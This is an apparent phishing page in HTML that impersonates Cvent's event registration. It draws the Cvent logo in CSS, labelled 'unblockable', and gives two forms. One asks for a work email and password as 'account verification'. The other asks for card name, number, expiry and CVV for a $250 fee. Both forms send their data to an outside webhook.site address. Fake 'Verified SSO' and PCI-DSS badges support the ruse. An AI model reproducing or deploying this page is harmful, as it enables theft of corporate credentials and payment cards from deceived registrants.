<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cvent Event Registration - Secure Payment</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; }
        
        /* CSS-ONLY LOGO (UNBLOCKABLE) */
        .header { background: #fff; text-align: center; padding: 30px 0; border-bottom: 2px solid #f2f2f2; width: 100%; display: flex; justify-content: center; align-items: center; }
        .logo-text { font-size: 32px; font-weight: bold; color: #333; letter-spacing: -1px; display: flex; align-items: center; }
        .logo-circle { width: 34px; height: 34px; border: 6px solid #0066cc; border-radius: 50%; border-right-color: transparent; margin-right: 8px; transform: rotate(45deg); }
        .logo-c { color: #0066cc; margin-right: 2px; }

        .main-content { display: flex; min-height: calc(100vh - 120px); }
        .pane { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 50px; }
        
        .left { background-color: #f9fafb; border-right: 1px solid #eee; }
        .right { background-color: #ffffff; }
        
        .container { width: 100%; max-width: 380px; }
        h2 { font-size: 24px; margin-bottom: 12px; color: #111; font-weight: 600; }
        p { font-size: 15px; color: #555; margin-bottom: 30px; line-height: 1.6; }
        
        .input-group { margin-bottom: 18px; text-align: left; }
        label { display: block; font-size: 11px; font-weight: 700; color: #000; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 6px; box-sizing: border-box; font-size: 15px; background: #fff; }
        input:focus { border-color: #0066cc; outline: none; box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1); }
        
        .row { display: flex; gap: 15px; }
        button { width: 100%; padding: 16px; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        
        .btn-blue { background-color: #0066cc; }
        .btn-blue:hover { background-color: #0056b3; }
        .btn-green { background-color: #059669; }
        .btn-green:hover { background-color: #047857; }
        
        .footer-note { margin-top: 30px; font-size: 12px; color: #999; text-align: center; }
        .badge { color: #059669; font-weight: bold; font-size: 12px; margin-top: 10px; display: block; }
    </style>
</head>
<body>

    <!-- CSS-ONLY LOGO HEADER -->
    <header class="header">
        <div class="logo-text">
            <div class="logo-circle"></div>
            <span class="logo-c">c</span>vent
        </div>
    </header>

    <div class="main-content">
        <!-- LEFT SIDE: ACCOUNT -->
        <div class="pane left">
            <div class="container">
                <h2>Account Verification</h2>
                <p>Verify your corporate identity to link this registration and apply any member discounts.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Email Address</label>
                        <input type="email" name="email" placeholder="work@company.com" required>
                    </div>
                    <div class="input-group">
                        <label>Password</label>
                        <input type="password" name="password" placeholder="••••••••" required>
                    </div>
                    <button type="submit" class="btn-blue">Verify & Connect</button>
                    <span class="badge">🔒 Verified SSO Connection</span>
                </form>
            </div>
        </div>

        <!-- RIGHT SIDE: PAYMENT -->
        <div class="pane right">
            <div class="container">
                <h2>Secure Payment</h2>
                <p>Finalize your registration. Fee: <strong>$250.00 USD</strong>.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Name On Card</label>
                        <input type="text" name="cc_name" placeholder="John Doe" required>
                    </div>
                    <div class="input-group">
                        <label>Card Number</label>
                        <input type="text" name="cc_number" placeholder="0000 0000 0000 0000" required maxlength="16">
                    </div>
                    <div class="row">
                        <div class="input-group" style="flex: 2;">
                            <label>Expiration</label>
                            <input type="text" name="cc_exp" placeholder="MM / YY" required maxlength="5">
                        </div>
                        <div class="input-group" style="flex: 1;">
                            <label>CVV</label>
                            <input type="text" name="cc_cvv" placeholder="123" required maxlength="4">
                        </div>
                    </div>
                    <button type="submit" class="btn-green">Pay Now</button>
                    <div class="footer-note">Compliant with PCI-DSS 4.0 Standards</div>
                </form>
            </div>
        </div>
    </div>

</body>
</html>
